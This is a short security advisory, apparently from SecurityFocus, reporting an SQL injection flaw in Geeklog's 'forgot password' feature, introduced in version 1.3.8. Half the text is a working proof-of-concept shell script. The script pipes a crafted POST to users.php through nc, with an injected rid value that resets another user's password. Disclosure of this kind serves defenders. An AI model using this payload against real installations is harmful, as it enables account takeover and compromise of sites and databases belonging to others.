source: http://www.securityfocus.com/bid/8849/info

An SQL injection vulnerability has been reported in the Geeklog "forgot password" feature (introduced in Geeklog 1.3.8). Due to insufficient sanitization of user-supplied input, it is possible for remote attacks to influence database queries. This could result in compromise of the Geeklog installation or attacks against the database. 

------------->8------------->8------------->8------------->8--------------
#!/bin/sh

echo "POST /path/to/gl/users.php HTTP/1.0
Content-length: 50
Content-type: application/x-www-form-urlencoded

mode=setnewpwd&passwd=new&uid=2&rid=3'+or+uid='1&
" | nc localhost 80

------------->8------------->8------------->8------------->8--------------